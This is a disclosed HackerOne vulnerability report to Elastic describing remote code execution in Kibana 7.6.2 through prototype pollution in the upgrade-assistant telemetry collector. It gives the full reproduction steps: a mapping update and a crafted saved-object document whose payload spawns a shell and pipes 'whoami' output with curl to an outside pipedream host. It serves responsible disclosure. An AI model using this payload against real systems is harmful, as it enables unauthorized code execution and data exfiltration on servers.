# Remote Code Execution on Cloud via latest Kibana 7.6.2

## Report Details
- **Report ID**: 852613
- **URL**: https://hackerone.com/reports/852613
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-04-17T22:49:58.303Z
- **Disclosed**: 2020-07-28T19:45:35.016Z

## Reporter
- **Username**: alexbrasetvik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: elastic

## Vulnerability Information
**Summary:** A prototype pollution in Kibana can be used to gain remote code execution.

**Description:**

There is a prototype pollution bug in the upgrade assistant's telemetry collector, via a dangerous usage of `_.set`: https://github.com/elastic/kibana/blob/master/x-pack/plugins/upgrade_assistant/server/lib/telemetry/usage_collector.ts#L93

We can pollute the prototype by providing a specially crafted "upgrade-assistant-telemetry" "saved object".

The attached video provides a walkthrough. There is a bit of waiting involved at one point, I included the entire thing for completeness with a hint of when you can fast forward :) 

## Steps To Reproduce:

The following assumes an otherwise empty Kibana. If any steps breaks Kibana, you can `DELETE /.kibana*` and restart it to get going again.

  1. Update the kibana mappings so we can provide our "upgrade-assistant-telemetry" document. It's important to provide the full mapping and not just do a dynamic one, or Kibana can refuse to start up due to err-ing when validating mappings

```
PUT /.kibana_1/_mappings
{
  "properties": {
    "upgrade-assistant-telemetry": {
      "properties": {
        "constructor": {
          "properties": {
            "prototype": {
              "properties": {
                "sourceURL": {
                  "type": "text",
                  "fields": {
                    "keyword": {
                      "type": "keyword",
                      "ignore_above": 256
                    }
                  }
                }
              }
            }
          }
        },
        "features": {
          "properties": {
            "deprecation_logging": {
              "properties": {
                "enabled": {
                  "type": "boolean",
                  "null_value": true
                }
              }
            }
          }
        },
        "ui_open": {
          "properties": {
            "cluster": {
              "type": "long",
              "null_value": 0
            },
            "indices": {
              "type": "long",
              "null_value": 0
            },
            "overview": {
              "type": "long",
              "null_value": 0
            }
          }
        },
        "ui_reindex": {
          "properties": {
            "close": {
              "type": "long",
              "null_value": 0
            },
            "open": {
              "type": "long",
              "null_value": 0
            },
            "start": {
              "type": "long",
              "null_value": 0
            },
            "stop": {
              "type": "long",
              "null_value": 0
            }
          }
        }
      }
    }
  }
}
```

  2. With the mapping ready, we can index our own telemetry status doc:

```
PUT /.kibana_1/_doc/upgrade-assistant-telemetry:upgrade-assistant-telemetry
{
    "upgrade-assistant-telemetry" : {
      "ui_open.overview" : 1,
      "ui_open.cluster" : 1,
      "ui_open.indices" : 1,
      "constructor.prototype.sourceURL": "\u2028\u2029\nglobal.process.mainModule.require('child_process').exec('whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-')"
    },
    "type" : "upgrade-assistant-telemetry",
    "updated_at" : "2020-04-17T20:47:40.800Z"
  }
```

The payload pollutes the prototype, which in turn injects Javascript that spawns a shell process, in this case `whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-`

  3. Wait until collection happens again, or just restart Kibana. In the video I restart Kibana, which you can do via the cloud console. Go to `https://cloud.elastic.co/deployments/[your id]/kibana` and click "Force Restart".

  4. Kibana will take about a minute to start. Soon after starting, it'll do a telemetry collection run, that'll cause the above code to be injected and that will run the shell code.

Kibana will likely keep starting, run this, crash then restart. I cleaned up my deployment so it's not in a crash-restart loop.

## Impact

Any cloud user can get remote code execution, as can any on-prem Kibana user that has x-pack installed.

## Supporting Material/References:

The attached video recording walks through the entire attack chain.

## Impact

Any cloud user can get remote code execution, as can any on-prem Kibana user that has x-pack installed.

## Attachments
- Cloud_RCE__Kibana_7.6.2.mp4
